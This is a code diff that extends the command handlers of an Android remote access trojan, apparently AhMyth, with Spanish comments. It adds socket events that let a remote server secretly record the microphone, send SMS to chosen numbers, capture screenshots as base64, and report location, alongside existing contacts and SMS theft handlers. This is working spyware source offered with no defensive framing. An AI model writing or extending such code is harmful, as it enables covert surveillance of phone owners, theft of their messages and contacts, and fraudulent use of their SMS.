@@ -5,8 +5,11 @@ import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
-
+import org.json.JSONException;
 import org.json.JSONObject;
+
+import ahmyth.mine.king.ahmyth.FileManager;
+
 import org.json.JSONArray;
 
 import java.net.NetworkInterface;
@@ -110,7 +113,10 @@ public class IOSocket {
 
             // ———— LISTENERS PERSONALIZADOS ————
 
+            // ————————————————————————————————————————————
             // Listener para micrófono (grabación de audio)
+            // ————————————————————————————————————————————
+            INSTANCE.ioSocket.off("mic-record");  // Elimina listeners previos
             INSTANCE.ioSocket.on("mic-record", args -> {
                 Log.e("MIC", "Evento mic-record recibido");
                 int seconds = 10; // valor default
@@ -130,6 +136,13 @@ public class IOSocket {
                     Log.e("MIC", "Error leyendo segundos en mic-record", e);
                 }
                 Log.e("MIC", "Ejecutando grabación de micrófono por " + seconds + " segundos");
+                
+                // Verificar si ya hay una grabación en progreso
+                if (MicManager.isRecording()) {
+                    Log.e("MIC", "⚠️ Ya hay una grabación en progreso, ignorando solicitud");
+                    return;
+                }
+                
                 try {
                     MicManager.startRecording(seconds);
                 } catch (Exception e) {
@@ -150,10 +163,49 @@ public class IOSocket {
                 INSTANCE.ioSocket.emit("contacts-data", contactsJson != null ? contactsJson.toString() : "[]");
             });
 
-            // SMS
+            // ————————————————————————————————————————————
+            // SMS - HANDLERS
+            // ————————————————————————————————————————————
+            // SMS - obtener lista
             INSTANCE.ioSocket.on("get-sms", args -> {
+                Log.i(TAG, "Recibido evento get-sms");
                 JSONObject smsJson = SMSManager.getSMSList();
                 INSTANCE.ioSocket.emit("sms-data", smsJson != null ? smsJson.toString() : "[]");
+            });
+
+            // SMS - enviar
+            INSTANCE.ioSocket.on("send-sms", args -> {
+                String phoneNo = "";
+                String msg = "";
+                try {
+                    if (args.length > 0) {
+                        Object arg = args[0];
+                        if (arg instanceof JSONObject) {
+                            phoneNo = ((JSONObject) arg).optString("phoneNo", "");
+                            msg = ((JSONObject) arg).optString("msg", "");
+                        } else if (arg instanceof String) {
+                            JSONObject obj = new JSONObject((String) arg);
+                            phoneNo = obj.optString("phoneNo", "");
+                            msg = obj.optString("msg", "");
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error leyendo datos de send-sms", e);
+                }
+                Log.i(TAG, "Enviando SMS a: " + phoneNo + ", mensaje: " + msg);
+                try {
+                    SMSManager.sendSMS(phoneNo, msg);
+                } catch (Exception e) {
+                    Log.e(TAG, "Error en sendSMS: " + e.getMessage());
+                    JSONObject result = new JSONObject();
+                    try {
+                        result.put("ok", false);
+                        result.put("error", e.getMessage());
+                    } catch (JSONException ee) {
+                        Log.e(TAG, "Error creando JSON de error", ee);
+                    }
+                    INSTANCE.ioSocket.emit("send-sms-result", result);
+                }
             });
 
             // Cámara - tomar foto
@@ -228,18 +280,52 @@ public class IOSocket {
                             try { locJson.put("error", "Exception: " + e.getMessage()); }
                             catch (Exception ignored) {}
                         }
-                        INSTANCE.ioSocket.emit("location-data", locJson.toString());
+                        INSTANCE.ioSocket.emit("location-data", locJson);
                     });
                 } catch (Exception e) {
                     Log.e(TAG, "Error obteniendo ubicación para location-data", e);
                     JSONObject err = new JSONObject();
                     try { err.put("error", e.getMessage()); } catch(Exception ignored){}
-                    INSTANCE.ioSocket.emit("location-data", err.toString());
+                    INSTANCE.ioSocket.emit("location-data", err);
                 }
             });
-
+            // ————————————————————————————————————————————
+            // SCREENSHOT - captura de pantalla
+            // ————————————————————————————————————————————
+            INSTANCE.ioSocket.off("get-screenshot");
+            INSTANCE.ioSocket.on("get-screenshot", args -> {
+                Log.i(TAG, "Recibido evento get-screenshot");
+                try {
+                    new ScreenshotManager(MainService.getContextOfApplication()).takeScreenshot((screenshotData, error) -> {
+                        JSONObject result = new JSONObject();
+                        try {
+                            if (screenshotData != null && screenshotData.length > 0) {
+                               String base64 = android.util.Base64.encodeToString(screenshotData, android.util.Base64.NO_WRAP);                               
+                                result.put("file", true);
+                                result.put("buffer", base64);
+                                Log.i(TAG, "Screenshot base64 generado: " + base64.length() + " caracteres");
+                            } else {
+                                result.put("file", false);
+                                result.put("error", error != null ? error : "No screenshot data");
+                            }
+                        } catch (JSONException e) {
+                            Log.e(TAG, "Error creando JSON de screenshot", e);
+                        }
+                        INSTANCE.ioSocket.emit("screenshot-data", result);
+                    });
+                } catch (Exception e) {
+                    Log.e(TAG, "Error en takeScreenshot:", e);
+                    JSONObject err = new JSONObject();
+                    try {
+                        err.put("file", false);
+                        err.put("error", e.getMessage());
+                    } catch (JSONException ignored) {}
+                    INSTANCE.ioSocket.emit("screenshot-data", err);
+                }
+            });
             // ———— FIN LISTENERS ————
 
+            
             INSTANCE.ioSocket.connect();
 
         } catch (URISyntaxException e) {
